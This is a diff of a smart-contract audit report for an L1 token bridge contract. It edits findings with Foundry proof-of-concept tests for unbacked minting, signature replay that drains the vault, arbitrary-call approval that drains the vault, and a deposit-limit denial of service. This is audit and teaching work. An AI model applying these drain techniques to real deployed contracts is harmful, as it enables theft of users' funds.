@@ -63,146 +63,186 @@
 
 ### [H-2] Calling `L1BossBridge::depositTokensToL2` from the Vault contract to the Vault contract allows infinite minting of unbacked L2 tokens
 
-`depositTokensToL2` function allows the caller to specify the `from` address, from which tokens are taken.
 
-Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `depositTokensToL2` function and transfer tokens from the vault to the vault itself. This would allow the attacker to trigger the `Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.
+**Description** Because the vault grants infinite approval to the bridge already (as can be seen in the contract's constructor), it's possible for an attacker to call the `L1BossBridge::depositTokensToL2` function and transfer tokens from the vault to the vault itself. 
 
-Additionally, they could mint all the tokens to themselves. 
+**Impact** This would allow the attacker to trigger the `L1BossBridge::Deposit` event any number of times, presumably causing the minting of unbacked tokens in L2.
 
-As a PoC, include the following test in the `L1TokenBridge.t.sol` file:
-
-```javascript
-function testCanTransferFromVaultToVault() public {
-    vm.startPrank(attacker);
-
-    // assume the vault already holds some tokens
-    uint256 vaultBalance = 500 ether;
-    deal(address(token), address(vault), vaultBalance);
-
-    // Can trigger the `Deposit` event self-transferring tokens in the vault
-    vm.expectEmit(address(tokenBridge));
-    emit Deposit(address(vault), address(vault), vaultBalance);
-    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
-
-    // Any number of times
-    vm.expectEmit(address(tokenBridge));
-    emit Deposit(address(vault), address(vault), vaultBalance);
-    tokenBridge.depositTokensToL2(address(vault), address(vault), vaultBalance);
-
-    vm.stopPrank();
-}
-```
-
-As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.
-
-### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed
-
-Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.
-
-However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.
-
-As a PoC, include the following test in the `L1TokenBridge.t.sol` file:
+**Proof of Concept** As a PoC, include the following test in the `L1TokenBridge.t.sol` file:
 
 ```javascript
-function testCanReplayWithdrawals() public {
-    // Assume the vault already holds some tokens
-    uint256 vaultInitialBalance = 1000e18;
-    uint256 attackerInitialBalance = 100e18;
-    deal(address(token), address(vault), vaultInitialBalance);
-    deal(address(token), address(attacker), attackerInitialBalance);
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
 
-    // An attacker deposits tokens to L2
-    vm.startPrank(attacker);
-    token.approve(address(tokenBridge), type(uint256).max);
-    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance); // put tokens in the vault
 
-    // Operator signs withdrawal.
-    (uint8 v, bytes32 r, bytes32 s) =
-        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);
+        // Can trigger the deposit event when we self transfer events from vault to vault
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
 
-    // The attacker can reuse the signature and drain the vault.
-    while (token.balanceOf(address(vault)) > 0) {
-        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
     }
-    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
-    assertEq(token.balanceOf(address(vault)), 0);
-}
 ```
 
-Consider redesigning the withdrawal mechanism so that it includes replay protection.
+**Recommended Mitigation** As suggested in H-1, consider modifying the `L1BossBridge::depositTokensToL2` function so that the caller cannot specify a `from` address.
+
+
+
+### [H-3] Lack of replay protection in `L1BossBridge::withdrawTokensToL1` allows withdrawals by signature to be replayed
+
+**Description** Users who want to withdraw tokens from the bridge can call the `L1BossBridge::sendToL1` function, or the wrapper `L1BossBridge::withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.
+
+**Impact** The signatures do not include any kind of replay-protection mechanisn (e.g., nonces, deadlines). Therefore, valid signatures from any bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.
+
+**Proof of Concept** As a PoC, include the following test in the `L1TokenBridge.t.sol` file:
+
+```javascript
+    function testSignatureReplay() public {
+        // assume the attacker and vault already holds some tokens
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        uint256 attackerInitialBalance = 100e18;
+        address attacker = makeAddr("attacker");
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // An attacker deposits tokens to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // attacker deposits tokens from their L1 wallet to their L2 wallet via the bridge
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+        
+        // on the L2, the attacker called the withdrawTokensToL1 function
+
+        // The signer/operator is going to sign the withdrawal on L2
+        // This is the message:
+        bytes memory message = abi.encode(
+            address(token), 
+            0, 
+            abi.encodeCall(
+                IERC20.transferFrom, 
+                (address(vault), attacker, attackerInitialBalance)
+            )
+        );
+        // This is the message, signed with the operator's keys and returning the v, r, s components of the signed message
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key, //operator private key
+            MessageHashUtils.toEthSignedMessageHash( // message formated to EIP-191
+                keccak256(message)
+            )
+        );
+
+        // Because the operators signed the message once, we can replay that message until the vault is empty
+        while(token.balanceOf(address(vault)) > 0) {
+            // The attacker can replay the signature and withdraw the tokens from the vault
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
+```
+
+**Recommended Mitigation** Redesign the withdrawal logic to implement replay protection via use of a `nonce` and the `chainid` of the withdrawal.
+
+
+
 
 ### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds
 
-The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.
+**Description** The `L1BossBridge::sendToL1` function can be called with a valid signature by an operator, which can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.
+ 
+**Impact** The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes it's `L1Vault::approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.
 
-The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.
-
-It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.
-
-To reproduce, include the following test in the `L1BossBridge.t.sol` file:
+**Proof of Concept** Place the following test in the `L1BossBridge.t.sol` file:
 
 ```javascript
-function testCanCallVaultApproveFromBridgeAndDrainVault() public {
-    uint256 vaultInitialBalance = 1000e18;
-    deal(address(token), address(vault), vaultInitialBalance);
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        // Give the vault an initial balance
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
 
-    // An attacker deposits tokens to L2. We do this under the assumption that the
-    // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
-    vm.startPrank(attacker);
-    vm.expectEmit(address(tokenBridge));
-    emit Deposit(address(attacker), address(0), 0);
-    tokenBridge.depositTokensToL2(attacker, address(0), 0);
+        // An attacker deposits tokens to L2. We do this under the assumption that the bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
 
-    // Under the assumption that the bridge operator doesn't validate bytes being signed
-    bytes memory message = abi.encode(
-        address(vault), // target
-        0, // value
-        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
-    );
-    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+        // Under the assumption that the bridge operator doesn't validate bytes being signed
+        bytes memory message = abi.encode(
+            address(vault), // target
+            0, // value
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // attack occurs here where we approve the attacker to spend all tokens from the vault
+        );
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
 
-    tokenBridge.sendToL1(v, r, s, message);
-    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
-    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
-}
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+        
+        //The attacker finally collects all tokens from the vault
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault))); 
+    }
 ```
 
-Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.
+**Recommended Mitigation** Redesign these functions to now allow arbitrary calldata, strictly the transfer functions associated with the vault depotis. In addition the signers could validate or create the calldata themselves.
 
 
+### [H-6] `L1BossBridge::depositTokensToL2`'s `L1BossBridge::DEPOSIT_LIMIT` check allows contract to be DoS'd if a malicious user fills up the vault.
 
-### [H-5] `CREATE` opcode does not work on zksync era
+**Description** In the `L1BossBridge::depositTokensToL2` function, deposits to the L1 vault are reverted if deposited amount would result in the balance of the vault exceeding the maximum balance set in the `L1BossBridge::DEPOSIT_LIMIT` constant:
 
-### [H-6] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd
-*Not shown in video*
+```javascript
+    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
+        revert L1BossBridge__DepositLimitReached();
+    }
+```
 
-### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited 
-*Not shown in video*
+**Impact** A malicious user can fill up the vault via donation or bridge which stops other users from accessing the protol.
 
-### [H-8] `TokenFactory::deployToken` locks tokens forever 
-*Not shown in video*
+**Proof of Concept** Place the following test in the `L1BossBridge.t.sol` file:
+
+```javascript
+    // DoS attack on the bridge by calling by filling up the vault with tokens
+    function testDosAttackOnVault() public {
+        // Vault has limit of number of tokens:
+        uint256 vaultDepositLimit = tokenBridge.DEPOSIT_LIMIT();
+
+        // Lets say at a point in time the vault has some number of tokens
+        uint256 currentVaultBalance = 1000e18;
+        deal(address(token), address(vault), currentVaultBalance);
+
+        // After some amount of tokens are added, the vault will be at the DEPOSIT_LIMIT
+        uint256 requiredDepositForDos = vaultDepositLimit - currentVaultBalance;
+
+        // An attacker can create a DoS by filling up the vault:
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        deal(address(token), address(attacker), requiredDepositForDos);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, requiredDepositForDos);
+
+        console2.log("Current vault balance: ", token.balanceOf(address(vault)));   
+
+        // Now a new user cannot use the service
+        address newUser = makeAddr("newUser");
+        vm.startPrank(newUser);
+        deal(address(token), address(newUser), 1e18);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
+        tokenBridge.depositTokensToL2(newUser, newUser, 1e18); // tx reverts
+    }
+```
 
 
-## Medium
+**Recommended Mitigation** Without increasing the cap of deposits, consider limiting the deposits from any single address to allow a sufficient number of users to use the platform.
 
-### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs
+todo below:
 
-During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.
-
-In particular, a malicious target may drop a [return bomb](https://github.com/nomad-xyz/ExcessivelySafeCall) to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.
-
-If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).
-
-## Low
-
-### [L-1] Lack of event emission during withdrawals and sending tokesn to L1
-
-Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.
-
-Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawals.
-
-*Not shown in video*
-### [L-2] `TokenFactory::deployToken` can create multiple token with same `symbol`
-
-*Not shown in video*
-### [L-3] Unsupported opcode PUSH0
